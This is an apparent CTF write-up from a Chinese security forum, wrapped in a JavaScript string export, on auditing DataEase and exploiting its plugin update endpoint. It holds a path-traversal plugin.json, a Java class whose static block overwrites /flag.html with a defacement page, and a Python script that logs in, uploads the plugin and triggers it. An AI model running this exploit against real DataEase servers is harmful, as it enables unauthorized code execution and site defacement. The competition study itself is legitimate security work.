const n=`# \u6587\u7AE0 - qwb-final-dataease\u4EE3\u7801\u5BA1\u8BA1  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 11:49 AM
URL: https://xz.aliyun.com/news/16057
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

## \u514D\u8D23\u58F0\u660E\uFF1A

\u672C\u6587\u7AE0\u5185\u5BB9\u4EC5\u4F9B\u6559\u80B2\u548C\u5B66\u4E60\u4F7F\u7528\uFF0C\u4E0D\u5F97\u7528\u4E8E\u975E\u6CD5\u6216\u6709\u5BB3\u76EE\u7684\u3002\u8BF7\u5728\u5408\u6CD5\u8303\u56F4\u5185\u5E94\u7528\u7F51\u7EDC\u5B89\u5168\u77E5\u8BC6\uFF0C\u5BF9\u4EFB\u4F55\u56E0\u4F7F\u7528\u672C\u6587\u5185\u5BB9\u9020\u6210\u7684\u635F\u5931\uFF0C\u6587\u7AE0\u4F5C\u8005\u4E0D\u627F\u62C5\u8D23\u4EFB\u3002
\u6587\u7AE0\u4F5C\u8005\u535A\u5BA2\u5730\u5740\u4E3A[https://n1ght.cn/](https://n1ght.cn/)

## \u6F0F\u6D1E\u5206\u6790

github\u8FDC\u7A0B\u6570\u636E\u5E93\u83B7\u53D6
\u4F7F\u7528gh\u67E5\u8BE2

gh api /repos/<owner>/<repo>/code-scanning/codeql/databases

\u8FD4\u56DE\u4FE1\u606F\u7C7B\u5982

[
{
"id": 52476457,
"name": "database.zip",
"language": "javascript",
"uploader": {
"login": "github-advanced-security[bot]",
"id": 62310815,
"node_id": "MDM6Qm90NjIzMTA4MTU=",
"avatar_url": "https://avatars.githubusercontent.com/in/57789?v=4",
"gravatar_id": "",
"url": "https://api.github.com/users/github-advanced-security%5Bbot%5D",
"html_url": "https://github.com/apps/github-advanced-security",
"followers_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/followers",
"following_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/following{/other_user}",
"gists_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/gists{/gist_id}",
"starred_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/starred{/owner}{/repo}",
"subscriptions_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/subscriptions",
"organizations_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/orgs",
"repos_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/repos",
"events_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/events{/privacy}",
"received_events_url": "https://api.github.com/users/github-advanced-security%5Bbot%5D/received_events",
"type": "Bot",
"site_admin": false
},
"content_type": "application/zip",
"size": 90378463,
"created_at": "2024-03-19T05:00:25Z",
"updated_at": "2024-03-19T05:00:27Z",
"url": "https://api.github.com/repositories/80249302/code-scanning/codeql/databases/javascript",
"commit_oid": "e9b53833523d88d9bee77a4d45b4868ab2bc9a25"
}
]

\u83B7\u53D6\u5230\u76F8\u5173\u5185\u5BB9\u4E0B\u8F7D

gh api /repos/<owner>/<repo>/code-scanning/codeql/databases/<language> -H 'Accept: application/zip' > path/to/local/database.zip

\u8BBE\u7F6E\u8BED\u8A00\u5373\u53EF\u4E0B\u8F7D

\u5B9E\u9A8C\u7684\u4EE3\u7801

gh api /repos/craftcms/cms/code-scanning/codeql/databases
gh api /repos/craftcms/cms/code-scanning/codeql/databases/javascript -H 'Accept: application/zip' > /mnt/h/test-database.zip

\u8FD4\u56DE\u5185\u5BB9

![](https://xzfile.aliyuncs.com/media/upload/picture/20241207225523-49a6325a-b4ab-1.png)

\u540E\u9762\u6211\u4EEC\u4F7F\u7528codeql\u8FDB\u884C\u67E5\u8BE2

\`\`\`
/**
 * @name Empty block
 * @kind problem
 * @problem.severity warning
 * @id java/example/empty-block
 */
import java
class SourceController extends Method  {
    SourceController(){
        getQualifiedName().regexpMatch(".+Controller.+")
    }
}
class SinkMethod extends Callable {
    SinkMethod(){
        getACallee().getName().regexpMatch(".*localInstall.*")
    }
}
from SourceController source,SinkMethod sink
where source.calls(sink)
select source,source.getQualifiedName(),sink,sink.getQualifiedName()
\`\`\`

\u4F7F\u7528codeql\u8FDB\u884C\u67E5\u8BE2

![](https://xzfile.aliyuncs.com/media/upload/picture/20241207225518-462e74a2-b4ab-1.png)

\u53EF\u4EE5\u770B\u5230

\`\`\`
server {
        listen       80;
        server_name  localhost;
        location = /flag.html {
            root   /usr/share/nginx/html;
        }
        location /api/plugin/upload {
            if ($request_method = POST) {
                return 403;
            }
        }
        location /driver/file/upload {
            if ($request_method = POST) {
                return 403;
            }
        }
        location /staticResource/upload/ {
            if ($request_method = POST) {
                return 403;
            }
        }
        location / {
            proxy_pass http://dataease:8081;  # \u5185\u7F51\u670D\u52A1\u5668\u5730\u5740
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
    }
\`\`\`

localupload\u676F\u7981\u7528\u4F46\u662Fupdate\u6CA1\u6709\u6211\u4EEC\u53EF\u4EE5\u8986\u76D6\u63D2\u4EF6\u540E\u8FDB\u884C\u8FDE\u63A5

![](https://xzfile.aliyuncs.com/media/upload/picture/20241207225510-41948ee0-b4ab-1.png)

\u9700\u8981\u6CE8\u610F\u7684\u662F

![](https://xzfile.aliyuncs.com/media/upload/picture/20241207225504-3e1bcc9c-b4ab-1.png)

\u8FD9\u6BB5\u4EE3\u7801\u6709\u4E00\u4E2A\u903B\u8F91

![](https://xzfile.aliyuncs.com/media/upload/picture/20241207225458-3aaef23c-b4ab-1.png)

\u6211\u4EEC\u7684plugin.json\u8981\u5199\u6210

{
"name": "\u8FBE\u68A6\u6570\u636E\u6E90\u63D2\u4EF6",
"store": "default",
"free": 0,
"cost": 0,
"category": "datasource",
"descript": "\u8FBE\u68A6\u6570\u636E\u6E90\u63D2\u4EF6",
"version": "1.18.26",
"creator": "DATAEASE",
"moduleName": "dm-backend",
"icon": null,
"dsType": "../default/dm"
}

\u6211\u4EEC\u901A\u8FC7\u7B80\u5355\u7684\u65B9\u6CD5patch\u4E00\u4E0B\u5373\u53EF\uFF0C\u4F46\u662Ffinal\u7684\u8981\u6C42\u662Fhack.html\u9875\u9762

\u4ED6\u7684hack.html\u9875\u9762\u5728/\u76EE\u5F55\u4E0B

package io.dataease.plugins.datasource.dm.provider;
import io.dataease.plugins.datasource.entity.JdbcConfiguration;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;
public class DmConfig extends JdbcConfiguration {
static {
try {
(new File("/flag.html")).delete();
FileOutputStream out = new FileOutputStream("/flag.html");
out.write(Base64.getDecoder().decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogIDx0aXRsZT5IYWNrIGJ5IFBvbGFyaXM8L3RpdGxlPg0KICA8c3R5bGU+DQogICAgYm9keSB7DQogICAgICBtYXJnaW46IDA7DQogICAgICBiYWNrZ3JvdW5kOiBibGFjazsNCiAgICAgIGRpc3BsYXk6IGZsZXg7DQogICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgICBoZWlnaHQ6IDEwMHZoOw0KICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgIGNvbG9yOiB3aGl0ZTsNCiAgICAgIGZvbnQtZmFtaWx5OiAnQXJpYWwnLCBzYW5zLXNlcmlmOw0KICAgIH0NCg0KICAgIC5oYWNrLXRleHQgew0KICAgICAgZm9udC1zaXplOiA1MHB4Ow0KICAgICAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsNCiAgICAgIHRleHQtc2hhZG93OiAwIDAgNXB4ICMwMGZmMDAsIDAgMCAxMHB4ICMwMGZmMDAsIDAgMCAyMHB4ICMwMGZmMDAsIDAgMCA0MHB4ICMwMGZmMDA7DQogICAgICBhbmltYXRpb246IGdsaXRjaCAycyBpbmZpbml0ZTsNCiAgICB9DQoNCiAgICBAa2V5ZnJhbWVzIGdsaXRjaCB7DQogICAgICAwJSwgMTAwJSB7DQogICAgICAgIHRleHQtc2hhZG93OiAwIDAgNXB4ICMwMGZmMDAsIDAgMCAxMHB4ICMwMGZmMDAsIDAgMCAyMHB4ICMwMGZmMDAsIDAgMCA0MHB4ICMwMGZmMDA7DQogICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDAsIDApOw0KICAgICAgfQ0KICAgICAgMjAlIHsNCiAgICAgICAgdGV4dC1zaGFkb3c6IC0ycHggLTJweCA1cHggI2ZmMDAwMCwgMnB4IDJweCAxMHB4ICMwMDAwZmYsIDJweCAycHggMjBweCAjZmYwMDAwOw0KICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtM3B4LCAycHgpOw0KICAgICAgfQ0KICAgICAgNDAlIHsNCiAgICAgICAgdGV4dC1zaGFkb3c6IDJweCAycHggNXB4ICNmZjAwMDAsIC0ycHggLTJweCAxMHB4ICMwMDAwZmYsIC0ycHggLTJweCAyMHB4ICNmZjAwMDA7DQogICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDNweCwgLTJweCk7DQogICAgICB9DQogICAgfQ0KDQogICAgLnNjYW5saW5lcyB7DQogICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgICB0b3A6IDA7DQogICAgICBsZWZ0OiAwOw0KICAgICAgd2lkdGg6IDEwMCU7DQogICAgICBoZWlnaHQ6IDEwMCU7DQogICAgICBiYWNrZ3JvdW5kOiByZXBlYXRpbmctbGluZWFyLWdyYWRpZW50KA0KICAgICAgICB0byBib3R0b20sDQogICAgICAgIHJnYmEoMCwgMCwgMCwgMC4xKSAwLA0KICAgICAgICByZ2JhKDAsIDAsIDAsIDAuMSkgMnB4LA0KICAgICAgICByZ2JhKDAsIDAsIDAsIDAuMikgMnB4LA0KICAgICAgICByZ2JhKDAsIDAsIDAsIDAuMikgNHB4DQogICAgICApOw0KICAgICAgcG9pbnRlci1ldmVudHM6IG5vbmU7DQogICAgICBhbmltYXRpb246IGZsaWNrZXIgMC4xcyBpbmZpbml0ZTsNCiAgICB9DQoNCiAgICBAa2V5ZnJhbWVzIGZsaWNrZXIgew0KICAgICAgMCUsIDEwMCUgew0KICAgICAgICBvcGFjaXR5OiAwLjg7DQogICAgICB9DQogICAgICA1MCUgew0KICAgICAgICBvcGFjaXR5OiAwLjY7DQogICAgICB9DQogICAgfQ0KICA8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQogIDxkaXYgY2xhc3M9ImhhY2stdGV4dCI+ZGF0YWVhc2UgSGFjayBieSBQb2xhcmlzPC9kaXY+DQogIDxkaXYgY2xhc3M9InNjYW5saW5lcyI+PC9kaXY+DQo8L2JvZHk+DQo8L2h0bWw+DQo="));
out.flush();
out.close();
} catch (IOException e) {
throw new RuntimeException(e);
}
}
public void setDriver(String driver) {
this.driver = driver;
}
public void setExtraParams(String extraParams) {
this.extraParams = extraParams;
}
private String driver = "dm.jdbc.driver.DmDriver";
private String extraParams;
public String getDriver() {
return this.driver;
}
public String getExtraParams() {
return this.extraParams;
}
public String getJdbc() {
return "jdbc:dm://HOST:PORT"
.replace("HOST", getHost().trim())
.replace("PORT", getPort().toString());
}
}

\u5373\u53EF

\u81EA\u52A8\u5316\u811A\u672C\uFF0C\u65B9\u4FBF\u6F14\u793A

zip -r poc.zip patch.jar plugin.json

\u6253\u5305\u6210poc.zip\uFF0Cpatch\u7684jar\u5305\u5C31\u4E0D\u7ED9\u4E86\uFF0C\u4E0D\u89C9\u5F97\u81EA\u5DF1\u5206\u6790\u662F\u89C1\u5F88\u6709\u8DA3\u7684\u4E8B\u60C5\u5417\uFF0C\u8DDF\u6253\u6E38\u620F\u4E00\u6837\uFF0C\u6240\u4EE5\u53EA\u6709\u5927\u4F53\u601D\u8DEF

import requests
import re
url = input("\u8BF7\u8F93\u5165url\u5730\u5740\uFF08\u4F8B\u5982\uFF1A192.168.0.1\uFF09: \\n")
# url = "192.168.0.102"
login_url = "http://{}:81/api/auth/login".format(url)
data = {
"loginType":0,
"password":"myZuoVBN0QkzG8ZDOfqsROJ/LvtyNUR9cdZD/TPCUdK8YuJOZgrfPqou29VXKlpW3SGIh++S4c6SwVhKg1yreg==",
"username":"Vaa0/f4hbQNlZG7XIIk4uofw5di11LAy4HY8XucvH+qmu4mYouUd1jdBkLDTcfNHCImrlOXbM6Un2FapQfkjlg=="
}
login_resp = requests.post(login_url,json=data)
token = re.findall('token":"(.+?)"}}',login_resp.text)[0]
if token:
print("\u767B\u5F55\u6210\u529F")
else:
print("\u767B\u5F55\u5931\u8D25")
header = {
"Authorization":token
}
print("token: {}".format(token))
files = {
"pluginId": (None, "13"),
"file": ("poc.zip", open("poc.zip", "rb"), "application/octet-stream")
}
attack_resp = requests.post("http://{}:81/api/plugin/update/13".format(url),files=files,headers=header)
if "true" in attack_resp.text:
print("\u6CE8\u5165\u6076\u610F\u4EE3\u7801\u6210\u529F")
else:
print("\u6CE8\u5165\u6076\u610F\u4EE3\u7801\u5931\u8D25")
connection = {"configuration":"{\\"initialPoolSize\\":5,\\"extraParams\\":\\"\\",\\"minPoolSize\\":5,\\"maxPoolSize\\":50,\\"maxIdleTime\\":30,\\"acquireIncrement\\":5,\\"idleConnectionTestPeriod\\":5,\\"connectTimeout\\":5,\\"customDriver\\":\\"default\\",\\"queryTimeout\\":30,\\"host\\":\\"1\\",\\"port\\":\\"1\\",\\"username\\":\\"1\\",\\"password\\":\\"1\\"}","apiConfiguration":[],"type":"dm","name":"1"}
requests.post("http://{}:81/datasource/getSchema/".format(url),headers=header,json=connection)
print("\u89E6\u53D1\u6210\u529F")
resp = requests.get("http://{}:81/flag.html".format(url))
if "Hack by Polaris" in resp.text:
print("\u653B\u51FB\u6210\u529F")

![](https://xzfile.aliyuncs.com/media/upload/picture/20241207225444-31ebd912-b4ab-1.png)`;export{n as _};
